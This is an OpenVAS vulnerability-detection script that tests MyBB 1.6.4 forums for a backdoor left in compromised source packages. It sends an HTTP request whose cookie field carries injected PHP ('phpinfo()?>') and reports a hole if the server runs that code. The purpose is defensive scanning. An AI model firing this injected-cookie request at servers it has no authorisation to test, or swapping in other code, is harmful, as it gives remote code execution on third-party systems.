###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_49993.nasl 13 2013-10-27 12:16:33Z jan $
#
# MyBB Compromised Source Packages Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "MyBB is prone to a backdoor vulnerability.

Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the
affected application.

MyBB versions 1.6.4 prior to October 6th, 2011 are vulnerable.";

tag_solution = "The vendor released an update. Please see the references for details.";

if (description)
{
 script_id(103292);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-10 15:33:49 +0200 (Mon, 10 Oct 2011)");
 script_bugtraq_id(49993);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("MyBB Compromised Source Packages Backdoor Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49993");
 script_xref(name : "URL" , value : "http://blog.mybb.com/2011/10/06/1-6-4-security-vulnerabilit/");
 script_xref(name : "URL" , value : "http://www.mybb.com/");
 script_xref(name : "URL" , value : "http://blog.mybb.com/wp-content/uploads/2011/10/mybb_1604_patches.txt");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if MyBB ist installed with a backdoor");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/mybb","/MyBB","/forum","/board",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered By.*MyBB")) {

    host = get_host_name();

    req = string(
              "GET ", url, " HTTP/1.1\r\n", 
              "Host: ", host, ":", port, "\r\n", 
              "Cookie: collapsed=0%7c1%7c2%7c3%7c4%7c5%7c6%7c7%7c8%7c9%7c10%7c11%7c12%7c13%7c14%7c15%7c16%7c17%7c18%7c19%7c20%7c21%7c22%7cphpinfo()?>",
             "\r\n\r\n"
            );

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< result) {
      security_hole(port:port);
      exit(0);
    }
  }
}

exit(0);

